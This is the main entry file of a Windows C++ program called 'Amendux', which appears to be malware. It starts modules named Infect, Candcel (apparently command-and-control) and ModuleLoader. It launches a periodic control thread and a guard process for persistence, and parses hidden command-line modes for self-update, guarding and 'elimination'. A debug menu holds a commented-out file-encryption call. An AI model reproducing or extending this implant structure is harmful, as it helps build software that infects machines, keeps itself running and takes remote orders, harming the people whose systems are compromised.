// main.cpp : Defines the entry point for the application.

#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "Process.h"
#include "Candcel.h"
#include "Infect.h"
#include "ModuleLoader.h"
#include "Resource.h"

#define MAX_LOADSTRING  100
#define MUTEX           L"avcmtx"
#define WINUICLASS      L"AVCWIN32PROG"

// Global Variables:
HINSTANCE hInst;                                // Current instance
HANDLE hMutex;									// Instance mutx lock

// Forward declarations of functions included in this code module:
ATOM                MainRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
BOOL                CleanupInstance();
BOOL                ParseCommandLine();
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);

	// Parse commandline arguments
	if (!ParseCommandLine()) {
		return false;
	}

    // Perform application initialization
    if (!InitInstance(hInstance, nCmdShow)) {
        return false;
    }

	// Initialize instance
	Amendux::Log::Init();
	Amendux::Config::Init();

	// If anything failed at this moment, disengage
	if (!Amendux::Config::Success()) {
		PostQuitMessage(0);
	}

	// Run core classes
	Amendux::Infect::Init();
	Amendux::Candcel::Init();
	Amendux::ModuleLoader::Init();
	Amendux::Process::Guard();

	// Launch the threading processes
	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
	Amendux::Process::SpawnGuard();

	// Window accelerators
	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));

	// Main message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

	// Terminate modules in reverse order
	Amendux::ModuleLoader::Terminate();
	Amendux::Candcel::Terminate();
	Amendux::Infect::Terminate();
	Amendux::Config::Terminate();
	Amendux::Log::Terminate();

	// Perform application cleanup
	if (!CleanupInstance()) {
		return false;
	}

    return (int)msg.wParam;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ulCall, LPVOID lpReserved)
{
	switch (ulCall) {
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}

	return TRUE;
}


//
//  FUNCTION: MainRegisterClass()
//
//  PURPOSE: Registers the window class.
//
#if DEBUG
ATOM MainRegisterClass(HINSTANCE hInstance)
{

    WNDCLASSEXW wcex;

    wcex.cbSize         = sizeof(WNDCLASSEX);
    wcex.style          = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
	wcex.hIcon          = 0; // LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN32PROJECT1));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WIN32PROJECT1);
    wcex.lpszClassName  = WINUICLASS;
    wcex.hIconSm        = 0; // LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}
#endif


//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	if (!Amendux::Config::Current()->CanGuardProcess()) {
		hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX);

		if (hMutex) {
			return false;
		}

		// Prevent other instances
		hMutex = CreateMutex(0, 0, MUTEX);
	}

#if DEBUG
	// Main window 
	MainRegisterClass(hInstance);
	HWND hWnd = CreateWindowW(WINUICLASS, L"Amendux [DEBUG MODE]", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
	if (!hWnd) {
		ReleaseMutex(hMutex);
		return false;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);
#endif

   // Drift random by planting the seed
   srand((unsigned int)time(NULL));

   return true;
}


//
//   FUNCTION: CleanupInstance()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL CleanupInstance()
{
	ReleaseMutex(hMutex);

	return true;
}


//
//   FUNCTION: ParseCommandLine()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL ParseCommandLine()
{
	LPWSTR *szArgList;
	int argCount;

	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (!szArgList || argCount < 1) {
		return false;
	}

	for (int i = 1; i < argCount; i++) {
		WCHAR *szCmd = szArgList[i];

		// Run update mode
		if ((!wcscmp(szCmd, L"/nu") || !wcscmp(szCmd, L"/NU") || !wcscmp(szCmd, L"/Nu") || !wcscmp(szCmd, L"/nU")) && argCount > 2) {
			unsigned int pid = _wtoi(szArgList[i + 1]);
			if (pid < 1) {
				continue;
			}

			// Give the main module some time to enter message loop
			Sleep(10 * 1000);

			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
			Amendux::Process::EndProcess(pid, 10);

			// Give the main moduke some time to release mutex
			Sleep(10 * 1000);

			return true;
		}

		// Spawn a guard
		if ((!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG") || !wcscmp(szCmd, L"/Sg") || !wcscmp(szCmd, L"/sG")) && argCount > 2) {
			unsigned int pid = _wtoi(szArgList[i + 1]);
			if (pid < 1) {
				continue;
			}

			Amendux::Config::Current()->SetMode(Amendux::OperationMode::GUARD);
			Amendux::Config::Current()->SetGuardProcessId(pid);
			return true;
		}

		// Run elimination mode
		if (!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL") || !wcscmp(szCmd, L"/El") || !wcscmp(szCmd, L"/eL")) {
			Amendux::Config::Current()->SetMode(Amendux::OperationMode::ELIMINATE);
			return true;
		}

	}

	LocalFree(szArgList);

	return true;
}


//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
#if DEBUG
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
		case WM_COMMAND: {
				int wmId = LOWORD(wParam);
				// Parse the menu selections:
				switch (wmId) {
					case IDM_ABOUT:
						DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
						break;
					case IDM_ENCRYPT:
						// FileCrypt.Run();
						break;
					case IDM_DEBUG:
						DialogBox(hInst, MAKEINTRESOURCE(IDD_TEST), hWnd, Debug);
						break;
					case IDM_EXIT:
						DestroyWindow(hWnd);
						break;
					default:
						return DefWindowProc(hWnd, message, wParam, lParam);
				}
			}
			break;
		case WM_PAINT: {
				PAINTSTRUCT ps;
				HDC hdc = BeginPaint(hWnd, &ps);
				// TODO: Add any drawing code that uses hdc here...
				EndPaint(hWnd, &ps);
			}
			break;
		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
    }

	return 0;
}


// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			SetDlgItemText(hDlg, IDC_STATIC_VERSION, (L"Amendux, Version " + Amendux::Config::getVersion()).c_str());
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
    }

	return (INT_PTR)FALSE;
}


// Message handler for about box.
INT_PTR CALLBACK Debug(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			SetDlgItemText(hDlg, IDC_DEBUG_CONSOLE, Amendux::Log::Readback().c_str());
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
	}

	return (INT_PTR)FALSE;
}
#endif
